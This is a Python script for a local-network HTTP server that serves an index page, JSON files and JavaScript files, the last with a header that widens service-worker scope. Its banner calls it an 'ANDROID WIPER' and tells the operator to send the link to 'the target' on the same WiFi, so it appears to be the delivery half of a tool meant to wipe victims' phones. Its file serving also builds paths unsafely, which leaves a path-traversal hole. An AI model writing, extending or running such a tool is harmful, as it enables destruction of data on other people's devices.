"""Server for local network — no external downloads needed"""
import http.server
import socketserver
import os
import socket

PORT = 8080
DIR = os.path.dirname(os.path.abspath(__file__))

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIR, **kwargs)

    def do_GET(self):
        path = self.path.split('?')[0]

        if path.endswith('.json'):
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            with open(DIR + path.replace('/', '\\'), 'rb') as f:
                self.wfile.write(f.read())
            return

        if path.endswith('.js'):
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.send_header('Service-Worker-Allowed', '/')
            self.end_headers()
            with open(DIR + path.replace('/', '\\'), 'rb') as f:
                self.wfile.write(f.read())
            return

        if path == '/' or path.endswith('.html'):
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('X-Content-Type-Options', 'nosniff')
            self.end_headers()
            with open(DIR + '\\index.html', 'rb') as f:
                self.wfile.write(f.read())
            return

        super().do_GET()

    def log_message(self, format, *args):
        print(f"[+] {args[0]} {args[1]} {args[2]}")

if __name__ == '__main__':
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    httpd = socketserver.TCPServer(("0.0.0.0", PORT), Handler)

    print("=" * 60)
    print("  ANDROID WIPER — READY")
    print("=" * 60)
    print(f"  Send this link to the target:")
    print(f"")
    print(f"  🔗  http://{local_ip}:{PORT}")
    print(f"")
    print(f"  ⚠️  Target must be on the SAME WiFi network")
    print(f"  ⚠️  No internet required")
    print(f"  ⚠️  Opens port {PORT} on your firewall")
    print("=" * 60)
    print("  Press Ctrl+C to stop")
    print("=" * 60)
    
    httpd.serve_forever()